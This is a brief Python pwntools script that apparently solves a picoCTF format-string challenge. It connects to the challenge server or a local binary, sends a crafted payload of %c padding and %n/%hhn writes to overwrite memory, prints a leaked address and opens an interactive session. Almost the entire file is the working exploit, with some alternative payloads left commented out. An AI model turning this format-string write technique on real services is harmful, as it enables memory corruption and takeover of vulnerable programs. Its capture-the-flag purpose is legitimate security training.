from pwn import *

if args.LOCAL:
    r = process('./vuln')
else:
    r = remote('mercury.picoctf.net', 5654)

payload = '%c'*10 + '%6299662c%n' + '%216c%20$hhn' + '%10504067c%10$n'
# payload = '%3386c%12$hn'# + '%1852400175'
payload = '%6299672c%12$n' + '%256c%20$hhn'# + '%10504067c%10$n'
r.sendline(b'1')
raw_input()
r.sendlineafter(b"token?", payload.encode())
r.recvlines(2)
write_addr = int(r.recv(10)[::-1].hex(), 16)
success(f"write address = {hex(write_addr)}")
r.interactive()